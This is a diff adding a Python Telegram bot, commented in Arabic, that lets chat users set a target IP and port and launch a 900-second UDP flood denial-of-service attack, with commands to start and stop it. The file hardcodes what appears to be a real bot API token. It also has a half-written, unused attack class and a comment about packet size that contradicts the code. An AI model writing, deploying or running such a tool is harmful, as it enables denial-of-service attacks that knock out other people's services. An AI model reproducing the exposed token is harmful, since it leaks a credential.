@@ -1,0 +1,102 @@
+import telebot
+import socket
+import random
+import threading
+import time
+
+# مفتاح API الخاص ببوت التليجرام
+API_TOKEN = '8049812512:AAHmpPMZtqvW8SMRktXgIh0pSn-TO8GdjbM'
+bot = telebot.TeleBot(API_TOKEN)
+
+# المتغيرات العامة
+target_ip = None
+target_port = None
+attack_thread = None
+attack_active = False
+
+# وظيفة للهجوم باستخدام بروتوكول UDP
+
+
+
+class UDPAttack:
+    def init(self, target_ip, target_port, packet_size=1024):
+        self.target_ip = target_ip
+        self.target_port = target_port
+        self.packet_size = packet_size
+        self.stop_flag = False
+        
+        
+        
+        
+        
+     
+    
+       
+     
+     
+            
+               
+       
+        
+        
+
+
+def udp_flood(target_ip, target_port, duration, chat_id):
+    global attack_active
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(999)  # حجم الحزمة: 2000 بايت
+    end_time = time.time() + duration
+
+    bot.send_message(chat_id, f"بدأ الهجوم على {target_ip}:{target_port} لمدة {duration} ثانية.")
+    while time.time() < end_time and attack_active:
+        try:
+            sock.sendto(bytes, (target_ip, target_port))
+        except Exception as e:
+            bot.send_message(chat_id, f"خطأ أثناء إرسال الحزم: {e}")
+            break
+    bot.send_message(chat_id, "تم إيقاف الهجوم.")
+    sock.close()
+    attack_active = False
+
+# أمر تعيين الهدف
+@bot.message_handler(commands=['set_target'])
+def set_target(message):
+    global target_ip, target_port
+    try:
+        target = message.text.split()[1]
+        target_ip, target_port = target.split(":")
+        target_port = int(target_port)
+        bot.reply_to(message, f"تم تعيين الهدف: {target_ip}:{target_port}")
+    except (IndexError, ValueError):
+        bot.reply_to(message, "صيغة غير صحيحة. استخدم /set_target IP:PORT")
+
+# أمر بدء الهجوم
+@bot.message_handler(commands=['start_attack'])
+def start_attack(message):
+    global attack_thread, attack_active
+    if not target_ip or not target_port:
+        bot.reply_to(message, "الرجاء تعيين الهدف أولاً باستخدام /set_target")
+        return
+
+    if attack_active:
+        bot.reply_to(message, "الهجوم قيد التشغيل بالفعل.")
+        return
+
+    attack_active = True
+    attack_thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, 900, message.chat.id))
+    attack_thread.start()
+    bot.reply_to(message, "تم بدء الهجوم.")
+
+# أمر إيقاف الهجوم
+@bot.message_handler(commands=['stop_attack'])
+def stop_attack(message):
+    global attack_active
+    if not attack_active:
+        bot.reply_to(message, "لا يوجد هجوم قيد التشغيل.")
+        return
+
+    attack_active = False
+    bot.reply_to(message, "تم إيقاف الهجوم.")
+
+# تشغيل البوت
+bot.polling()
